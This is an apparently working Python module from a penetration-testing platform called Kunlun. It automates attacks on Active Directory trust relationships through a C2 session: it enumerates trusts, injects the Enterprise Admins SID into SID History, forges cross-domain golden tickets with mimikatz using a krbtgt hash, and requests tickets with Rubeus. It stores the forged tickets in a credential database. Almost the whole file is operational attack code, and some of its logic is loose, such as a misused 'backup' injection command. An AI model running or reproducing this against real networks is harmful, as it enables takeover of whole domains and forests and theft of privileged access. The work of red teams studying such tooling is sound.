"""Cross-domain trust exploitation module for Kunlun penetration testing platform.

Provides:
- Domain trust relationship enumeration and analysis
- SID History injection for cross-domain privilege escalation
- Cross-domain Kerberos attack (golden ticket, TGT forwarding)
- Cleanup and audit trail
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class TrustType(Enum):
    """Type of domain trust relationship."""
    PARENT_CHILD = "parent_child"
    TREE_ROOT = "tree_root"
    FOREST = "forest"
    EXTERNAL = "external"
    REALM = "realm"


class TrustDirection(Enum):
    """Direction of trust relationship."""
    BIDIRECTIONAL = "bidirectional"
    INBOUND = "inbound"
    OUTBOUND = "outbound"


class TrustAttribute(Enum):
    """Trust attributes."""
    NON_TRANSITIVE = "non_transitive"
    UPLEVEL_ONLY = "uplevel_only"
    QUARANTINED_DOMAIN = "quarantined_domain"
    FOREST_TRANSITIVE = "forest_transitive"
    CROSS_ORGANIZATION = "cross_organization"
    WITHIN_FOREST = "within_forest"
    TREAT_AS_EXTERNAL = "treat_as_external"


@dataclass
class TrustRelationship:
    """Domain trust relationship information.

    Attributes:
        source_domain: Source domain name
        target_domain: Target domain name
        trust_type: Type of trust
        trust_direction: Trust direction
        trust_attributes: Trust attributes
        sid_filtering_enabled: Whether SID filtering is enabled
        exploitable: Whether trust is exploitable
        exploitation_method: Recommended exploitation method
        high_value_accounts: High-value accounts in trusted domain
    """
    source_domain: str = ""
    target_domain: str = ""
    trust_type: TrustType = TrustType.EXTERNAL
    trust_direction: TrustDirection = TrustDirection.OUTBOUND
    trust_attributes: List[TrustAttribute] = field(default_factory=list)
    sid_filtering_enabled: bool = True
    exploitable: bool = False
    exploitation_method: str = ""
    high_value_accounts: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "source_domain": self.source_domain,
            "target_domain": self.target_domain,
            "trust_type": self.trust_type.value,
            "trust_direction": self.trust_direction.value,
            "sid_filtering_enabled": self.sid_filtering_enabled,
            "exploitable": self.exploitable,
            "exploitation_method": self.exploitation_method,
            "high_value_accounts": self.high_value_accounts,
        }


@dataclass
class SIDHistoryInjectionResult:
    """Result of SID History injection.

    Attributes:
        success: Whether injection succeeded
        target_user: Target user for injection
        injected_sid: Injected SID value
        source_domain: Source domain of injected SID
        verification_passed: Whether verification passed
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    target_user: str = ""
    injected_sid: str = ""
    source_domain: str = ""
    verification_passed: bool = False
    error_message: str = ""
    attck_technique: str = "T1178"
    duration_seconds: float = 0.0


@dataclass
class CrossDomainKerberosResult:
    """Result of cross-domain Kerberos attack.

    Attributes:
        success: Whether attack succeeded
        attack_type: Type of Kerberos attack
        target_domain: Target domain
        ticket_data: Ticket data (base64)
        ticket_type: Type of ticket (TGT/ST)
        ticket_lifetime: Ticket lifetime
        krbtgt_hash_used: Whether krbtgt hash was used
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    attack_type: str = ""
    target_domain: str = ""
    ticket_data: str = ""
    ticket_type: str = ""
    ticket_lifetime: str = ""
    krbtgt_hash_used: bool = False
    error_message: str = ""
    attck_technique: str = "T1558.001"
    duration_seconds: float = 0.0


@dataclass
class CrossDomainAttackResult:
    """Result of cross-domain attack operation.

    Attributes:
        success: Whether operation succeeded
        trusts_found: Number of trust relationships found
        exploitable_trusts: Number of exploitable trusts
        sid_history_result: SID History injection result
        kerberos_result: Cross-domain Kerberos result
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
    """
    success: bool = False
    trusts_found: int = 0
    exploitable_trusts: int = 0
    sid_history_result: Optional[SIDHistoryInjectionResult] = None
    kerberos_result: Optional[CrossDomainKerberosResult] = None
    error_message: str = ""
    attck_technique: str = "T1558"
    duration_seconds: float = 0.0


class CrossDomainTrustAttack:
    """Cross-domain trust exploitation module.

    Provides trust relationship analysis, SID History injection,
    cross-domain Kerberos attacks, and cleanup.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize cross-domain trust attack module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._discovered_trusts: List[TrustRelationship] = []
        self._injected_sid_history: List[Dict[str, str]] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("CrossDomain Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("CrossDomain: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def enumerate_trusts(self) -> List[TrustRelationship]:
        """Enumerate all domain trust relationships.

        Returns:
            List of discovered trust relationships.
        """
        trusts: List[TrustRelationship] = []

        try:
            await self._report_progress("枚举域信任关系", 10)
            await self._report_log("开始枚举域信任关系...")

            cmd = (
                "Get-ADTrust -Filter * -Properties * | "
                "Select-Object Name, Direction, TrustType, "
                "SIDFilteringQuarantined, ForestTransitive, "
                "Source, Target, DistinguishedName"
            )
            result = await self._execute_command(cmd)

            if result.get("success"):
                output = result.get("output", "")
                trusts = self._parse_trusts(output)

                for trust in trusts:
                    trust.exploitable = self._is_trust_exploitable(trust)
                    if trust.exploitable:
                        trust.exploitation_method = self._get_exploitation_method(trust)
                        await self._report_log(
                            f"[可利用] {trust.source_domain} <-> {trust.target_domain}: "
                            f"{trust.exploitation_method}"
                        )

            self._discovered_trusts = trusts

            await self._report_progress(
                f"发现 {len(trusts)} 个信任关系, "
                f"{sum(1 for t in trusts if t.exploitable)} 个可利用",
                100,
            )

        except Exception as e:
            logger.error("Trust enumeration failed: %s", e)
            await self._report_log(f"信任关系枚举失败: {e}")

        return trusts

    def _parse_trusts(self, output: str) -> List[TrustRelationship]:
        """Parse trust relationships from command output.

        Args:
            output: Command output.

        Returns:
            List of parsed trust relationships.
        """
        trusts: List[TrustRelationship] = []
        current_trust: Optional[Dict[str, str]] = None

        for line in output.split("\n"):
            line = line.strip()
            if not line:
                if current_trust:
                    trust = self._build_trust_from_dict(current_trust)
                    if trust:
                        trusts.append(trust)
                    current_trust = None
                continue

            if ":" in line:
                key, _, value = line.partition(":")
                key = key.strip().lower()
                value = value.strip()

                if current_trust is None:
                    current_trust = {}
                current_trust[key] = value

        if current_trust:
            trust = self._build_trust_from_dict(current_trust)
            if trust:
                trusts.append(trust)

        return trusts

    def _build_trust_from_dict(self, data: Dict[str, str]) -> Optional[TrustRelationship]:
        """Build TrustRelationship from parsed dictionary.

        Args:
            data: Parsed trust data.

        Returns:
            TrustRelationship or None.
        """
        try:
            trust = TrustRelationship()
            trust.source_domain = data.get("source", "")
            trust.target_domain = data.get("target", data.get("name", ""))

            direction = data.get("direction", "").lower()
            if "bidirectional" in direction or "双向" in direction:
                trust.trust_direction = TrustDirection.BIDIRECTIONAL
            elif "inbound" in direction or "入站" in direction:
                trust.trust_direction = TrustDirection.INBOUND
            else:
                trust.trust_direction = TrustDirection.OUTBOUND

            trust_type = data.get("trusttype", "").lower()
            if "parent" in trust_type:
                trust.trust_type = TrustType.PARENT_CHILD
            elif "tree" in trust_type:
                trust.trust_type = TrustType.TREE_ROOT
            elif "forest" in trust_type:
                trust.trust_type = TrustType.FOREST
            elif "external" in trust_type:
                trust.trust_type = TrustType.EXTERNAL
            elif "realm" in trust_type:
                trust.trust_type = TrustType.REALM

            sid_filtering = data.get("sidfilteringquarantined", "true").lower()
            trust.sid_filtering_enabled = "true" in sid_filtering

            forest_transitive = data.get("foresttransitive", "false").lower()
            if "true" in forest_transitive:
                trust.trust_attributes.append(TrustAttribute.FOREST_TRANSITIVE)

            return trust
        except Exception as e:
            logger.error("Failed to build trust from data: %s", e)
            return None

    def _is_trust_exploitable(self, trust: TrustRelationship) -> bool:
        """Check if trust relationship is exploitable.

        Args:
            trust: Trust relationship to check.

        Returns:
            True if exploitable.
        """
        if trust.trust_direction in (TrustDirection.BIDIRECTIONAL, TrustDirection.INBOUND):
            if not trust.sid_filtering_enabled:
                return True
            if trust.trust_type in (TrustType.PARENT_CHILD, TrustType.FOREST):
                return True
            if trust.trust_type == TrustType.EXTERNAL and not trust.sid_filtering_enabled:
                return True
        return False

    def _get_exploitation_method(self, trust: TrustRelationship) -> str:
        """Get recommended exploitation method for trust.

        Args:
            trust: Trust relationship.

        Returns:
            Exploitation method description.
        """
        if not trust.sid_filtering_enabled:
            return "SID History注入（SID过滤已禁用）"
        if trust.trust_type == TrustType.PARENT_CHILD:
            return "父域Enterprise Admins自动具有子域权限"
        if trust.trust_type == TrustType.FOREST:
            return "林内信任，可尝试krbtgt哈希传递"
        if trust.trust_direction == TrustDirection.BIDIRECTIONAL:
            return "双向信任，可尝试跨域Kerberos票据请求"
        return "信任关系可利用，需进一步分析"

    async def inject_sid_history(
        self,
        target_user: str,
        target_sid: str,
        source_domain: str = "",
    ) -> SIDHistoryInjectionResult:
        """Inject SID History into target user.

        Args:
            target_user: Target user for injection.
            target_sid: SID to inject (e.g., Enterprise Admins SID).
            source_domain: Source domain of the SID.

        Returns:
            SIDHistoryInjectionResult with injection status.
        """
        start_time = time.time()
        result = SIDHistoryInjectionResult(
            target_user=target_user,
            injected_sid=target_sid,
            source_domain=source_domain,
        )

        try:
            await self._report_progress("检测SID History注入权限", 10)
            await self._report_log(f"开始向 {target_user} 注入SID History: {target_sid}")

            has_permission = await self._check_sid_history_permission(target_user)
            if not has_permission:
                result.error_message = "不具备修改SID History的权限"
                result.duration_seconds = time.time() - start_time
                await self._report_log("SID History注入失败: 权限不足")
                return result

            await self._report_progress("执行SID History注入", 40)

            inject_cmd = (
                f"Set-ADUser -Identity \"{target_user}\" "
                f"-Add @{{SIDHistory='{target_sid}'}}"
            )
            inject_result = await self._execute_command(inject_cmd)

            if not inject_result.get("success"):
                result.error_message = "SID History注入失败"
                result.duration_seconds = time.time() - start_time
                await self._report_log("SID History注入失败")

                await self._report_progress("尝试备用注入方法", 60)
                backup_cmd = (
                    f"Add-ADGroupMember -Identity \"{target_user}\" "
                    f"-Members (Get-ADUser -Filter \"SID -eq '{target_sid}'\")"
                )
                backup_result = await self._execute_command(backup_cmd)
                if not backup_result.get("success"):
                    result.error_message = "所有SID History注入方法均失败"
                    result.duration_seconds = time.time() - start_time
                    return result

            result.success = True
            self._injected_sid_history.append({
                "user": target_user,
                "sid": target_sid,
                "domain": source_domain,
            })

            await self._report_progress("验证注入", 80)
            verified = await self._verify_sid_history(target_user, target_sid)
            result.verification_passed = verified

            if verified:
                await self._report_log("SID History注入成功并验证")
            else:
                await self._report_log("SID History注入成功但验证失败")

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"SID History注入异常: {e}")
            logger.error("SID History injection failed: %s", e)

        return result

    async def _check_sid_history_permission(self, target_user: str) -> bool:
        """Check if current user can modify SID History.

        Args:
            target_user: Target user.

        Returns:
            True if permission available.
        """
        try:
            cmd = (
                f"Get-Acl \"AD:$(Get-ADUser -Identity '{target_user}').DistinguishedName\" | "
                "Select-Object -ExpandProperty Access | "
                "Where-Object {$_.ActiveDirectoryRights -like '*WriteProperty*'}"
            )
            result = await self._execute_command(cmd)
            success = result.get("success")
            output = result.get("output", "")
            return bool(success) and bool(str(output).strip())
        except Exception:
            return False

    async def _verify_sid_history(self, target_user: str, target_sid: str) -> bool:
        """Verify SID History injection.

        Args:
            target_user: Target user.
            target_sid: Injected SID.

        Returns:
            True if verification passed.
        """
        try:
            cmd = (
                f"Get-ADUser -Identity \"{target_user}\" "
                f"-Properties SIDHistory | "
                "Select-Object -ExpandProperty SIDHistory"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                return target_sid in output
        except Exception as e:
            logger.error("SID History verification failed: %s", e)
        return False

    async def cross_domain_kerberos_attack(
        self,
        target_domain: str,
        krbtgt_hash: str = "",
        target_user: str = "administrator",
        attack_type: str = "golden_ticket",
    ) -> CrossDomainKerberosResult:
        """Execute cross-domain Kerberos attack.

        Args:
            target_domain: Target domain for attack.
            krbtgt_hash: Krbtgt NTLM hash (empty to use credential database).
            target_user: Target user for ticket.
            attack_type: Type of attack (golden_ticket/tgt_forward).

        Returns:
            CrossDomainKerberosResult with attack status.
        """
        start_time = time.time()
        result = CrossDomainKerberosResult(
            attack_type=attack_type,
            target_domain=target_domain,
        )

        try:
            await self._report_progress("准备跨域Kerberos攻击", 10)
            await self._report_log(f"开始跨域Kerberos攻击: {target_domain}")

            if not krbtgt_hash:
                await self._report_log("未提供krbtgt哈希，尝试从凭据库获取...")
                krbtgt_hash = await self._get_krbtgt_hash(target_domain)
                if not krbtgt_hash:
                    result.error_message = "无法获取krbtgt哈希"
                    result.duration_seconds = time.time() - start_time
                    return result

            result.krbtgt_hash_used = True

            if attack_type == "golden_ticket":
                await self._report_progress("生成跨域黄金票据", 30)
                ticket_result = await self._generate_cross_domain_golden_ticket(
                    target_domain,
                    krbtgt_hash,
                    target_user,
                )
            elif attack_type == "tgt_forward":
                await self._report_progress("转发TGT票据", 30)
                ticket_result = await self._forward_tgt(target_domain, target_user)
            else:
                result.error_message = f"不支持的攻击类型: {attack_type}"
                result.duration_seconds = time.time() - start_time
                return result

            if ticket_result.get("success"):
                result.success = True
                result.ticket_data = ticket_result.get("ticket", "")
                result.ticket_type = ticket_result.get("ticket_type", "TGT")
                result.ticket_lifetime = ticket_result.get("lifetime", "10小时")
                result.attck_technique = "T1558.001" if attack_type == "golden_ticket" else "T1550.003"

                await self._report_log(
                    f"跨域Kerberos攻击成功: {result.ticket_type}, "
                    f"有效期: {result.ticket_lifetime}"
                )

                if self.credential_db:
                    await self._store_kerberos_ticket(result, target_user)
            else:
                result.error_message = ticket_result.get("error", "票据生成失败")
                await self._report_log(f"跨域Kerberos攻击失败: {result.error_message}")

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"跨域Kerberos攻击异常: {e}")
            logger.error("Cross-domain Kerberos attack failed: %s", e)

        return result

    async def _get_krbtgt_hash(self, domain: str) -> str:
        """Get krbtgt hash from credential database.

        Args:
            domain: Target domain.

        Returns:
            Krbtgt NTLM hash.
        """
        if not self.credential_db:
            return ""

        try:
            cred = await self.credential_db.get_credential(
                username="krbtgt",
                domain=domain,
            )
            if cred:
                return str(cred.get("ntlm_hash", ""))
        except Exception as e:
            logger.error("Failed to get krbtgt hash: %s", e)
        return ""

    async def _generate_cross_domain_golden_ticket(
        self,
        target_domain: str,
        krbtgt_hash: str,
        target_user: str,
    ) -> Dict[str, Any]:
        """Generate cross-domain golden ticket.

        Args:
            target_domain: Target domain.
            krbtgt_hash: Krbtgt NTLM hash.
            target_user: Target username.

        Returns:
            Ticket generation result.
        """
        try:
            sid = await self._get_domain_sid(target_domain)
            if not sid:
                return {"success": False, "error": "无法获取域SID"}

            cmd = (
                f"!mimikatz kerberos::golden "
                f"/user:{target_user} "
                f"/domain:{target_domain} "
                f"/sid:{sid} "
                f"/krbtgt:{krbtgt_hash} "
                f"/ticket:{target_user}_{target_domain}.kirbi"
            )
            result = await self._execute_command(cmd)

            if result.get("success"):
                return {
                    "success": True,
                    "ticket": f"{target_user}_{target_domain}.kirbi",
                    "ticket_type": "TGT",
                    "lifetime": "10小时",
                }
            return {"success": False, "error": "黄金票据生成失败"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _forward_tgt(self, target_domain: str, target_user: str) -> Dict[str, Any]:
        """Forward TGT to target domain.

        Args:
            target_domain: Target domain.
            target_user: Target user.

        Returns:
            TGT forwarding result.
        """
        try:
            cmd = (
                f"Rubeus asktgs /service:krbtgt/{target_domain} "
                f"/dc:{target_domain} "
                f"/user:{target_user} "
                f"/nowrap"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                output = result.get("output", "")
                ticket = ""
                for line in output.split("\n"):
                    if "Base64" in line or "Ticket" in line:
                        ticket = line.split(":")[1].strip() if ":" in line else line.strip()
                return {
                    "success": True,
                    "ticket": ticket,
                    "ticket_type": "TGT",
                    "lifetime": "10小时",
                }
            return {"success": False, "error": "TGT转发失败"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def _get_domain_sid(self, domain: str) -> str:
        """Get domain SID.

        Args:
            domain: Domain name.

        Returns:
            Domain SID.
        """
        try:
            cmd = f"Get-ADDomain -Identity \"{domain}\" | Select-Object -ExpandProperty ObjectSID"
            result = await self._execute_command(cmd)
            if result.get("success"):
                return str(result.get("output", "")).strip()
        except Exception as e:
            logger.error("Failed to get domain SID: %s", e)
        return ""

    async def _store_kerberos_ticket(
        self,
        result: CrossDomainKerberosResult,
        target_user: str,
    ) -> None:
        """Store Kerberos ticket in credential database.

        Args:
            result: Kerberos attack result.
            target_user: Target username.
        """
        if not self.credential_db:
            return

        try:
            await self.credential_db.add_credential(
                username=target_user,
                domain=result.target_domain,
                ticket_data=result.ticket_data,
                credential_type=f"cross_domain_{result.attack_type}",
                is_high_value=True,
                source="cross_domain_kerberos",
            )
            await self._report_log("跨域票据已存入凭据库")
        except Exception as e:
            logger.error("Failed to store Kerberos ticket: %s", e)

    async def cleanup_sid_history(self, target_user: str) -> bool:
        """Clean up injected SID History.

        Args:
            target_user: Target user.

        Returns:
            True if cleanup successful.
        """
        try:
            await self._report_log(f"清理 {target_user} 的SID History...")

            injected = [
                entry for entry in self._injected_sid_history
                if entry["user"] == target_user
            ]

            if not injected:
                await self._report_log("未找到注入记录")
                return False

            for entry in injected:
                sid = entry["sid"]
                remove_cmd = (
                    f"Set-ADUser -Identity \"{target_user}\" "
                    f"-Remove @{{SIDHistory='{sid}'}}"
                )
                result = await self._execute_command(remove_cmd)
                if result.get("success"):
                    await self._report_log(f"SID {sid} 清理成功")
                    self._injected_sid_history.remove(entry)
                else:
                    await self._report_log(f"SID {sid} 清理失败")

            return True

        except Exception as e:
            logger.error("SID History cleanup failed: %s", e)
            return False

    async def execute_full_attack(
        self,
        target_domain: str,
        target_user: str = "administrator",
        inject_sid: bool = True,
        kerberos_attack: bool = True,
        krbtgt_hash: str = "",
    ) -> CrossDomainAttackResult:
        """Execute full cross-domain attack chain.

        Args:
            target_domain: Target domain.
            target_user: Target user.
            inject_sid: Whether to inject SID History.
            kerberos_attack: Whether to perform Kerberos attack.
            krbtgt_hash: Krbtgt hash for Kerberos attack.

        Returns:
            CrossDomainAttackResult with full attack status.
        """
        start_time = time.time()
        result = CrossDomainAttackResult()

        try:
            await self._report_log(f"开始跨域完整攻击: {target_domain}")

            await self._report_progress("枚举信任关系", 10)
            trusts = await self.enumerate_trusts()
            result.trusts_found = len(trusts)
            result.exploitable_trusts = sum(1 for t in trusts if t.exploitable)

            if inject_sid and trusts:
                exploitable = [t for t in trusts if t.exploitable]
                if exploitable:
                    target_sid = await self._get_enterprise_admins_sid(exploitable[0].target_domain)
                    if target_sid:
                        result.sid_history_result = await self.inject_sid_history(
                            target_user,
                            target_sid,
                            exploitable[0].target_domain,
                        )

            if kerberos_attack:
                result.kerberos_result = await self.cross_domain_kerberos_attack(
                    target_domain,
                    krbtgt_hash,
                    target_user,
                )

            result.success = bool(
                (result.sid_history_result and result.sid_history_result.success)
                or (result.kerberos_result and result.kerberos_result.success)
            )
            result.duration_seconds = time.time() - start_time

            await self._broadcast_event(result)

        except Exception as e:
            result.error_message = str(e)
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"跨域攻击失败: {e}")
            logger.error("Cross-domain attack failed: %s", e)

        return result

    async def _get_enterprise_admins_sid(self, domain: str) -> str:
        """Get Enterprise Admins group SID.

        Args:
            domain: Domain name.

        Returns:
            Enterprise Admins SID.
        """
        try:
            cmd = (
                f"Get-ADGroup -Identity \"Enterprise Admins\" -Server \"{domain}\" "
                f"| Select-Object -ExpandProperty SID"
            )
            result = await self._execute_command(cmd)
            if result.get("success"):
                return str(result.get("output", "")).strip()
        except Exception as e:
            logger.error("Failed to get Enterprise Admins SID: %s", e)
        return ""

    async def _broadcast_event(self, result: CrossDomainAttackResult) -> None:
        """Broadcast cross-domain attack event.

        Args:
            result: Attack result.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "cross_domain_attack",
                "success": result.success,
                "trusts_found": result.trusts_found,
                "exploitable_trusts": result.exploitable_trusts,
                "sid_history_success": result.sid_history_result.success if result.sid_history_result else False,
                "kerberos_success": result.kerberos_result.success if result.kerberos_result else False,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast cross-domain event: %s", e)
